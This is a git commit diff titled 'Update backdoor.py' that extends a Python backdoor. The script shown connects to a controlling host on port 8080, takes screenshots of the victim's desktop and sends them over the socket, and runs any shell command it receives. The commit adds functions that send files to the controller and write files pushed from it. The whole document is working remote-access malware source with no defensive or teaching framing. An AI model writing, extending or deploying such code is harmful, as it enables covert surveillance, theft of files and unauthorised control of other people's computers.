567d4b93a89345f10694ef1736434a65776d3ea8
Grandhi Naga Srikanth <nagasrikanthgrandhi@gmail.com>
2018-06-11 05:47:14 -0400

    Update backdoor.py

--- backdoor.py
+++ backdoor.py
@@ -4,7 +4,7 @@ import subprocess
 import gi
 gi.require_version('Gdk', '3.0')
 from gi.repository import Gdk
-
+import time
 ip="127.0.0.1"
 port=8080 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -15,10 +15,24 @@ def upload(filename):
     f=open(filename,"rb")
     data=f.read(1024)
     while (data):
+        print(data)
         s.send(data)
         data=f.read(1024)
+
     f.close()
+    time.sleep(1)
     s.send(b"DONE")
+
+def download(filename):
+        f=open(filename,"wb")
+        while True:
+            data=s.recv(1024)          
+            if  b"DONE" in data:
+                break
+            else:
+                f.write(data)
+        f.close()
+        print("done receving")
 
 while True:
     com=(s.recv(1024).decode())
@@ -33,6 +47,12 @@ while True:
         pb = Gdk.pixbuf_get_from_window(window, x, y, width, height)
         pb.savev("sc.png", "png", (), ())
         upload("sc.png")
+    elif com.startswith("upload"):
+        f=com[7:]
+        download(f)
+    elif com.startswith("download"):
+        f=com[9:]
+        upload(f)
     else:
         proc = subprocess.Popen(com[4:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         op= proc.stdout.read()+proc.stderr.read()
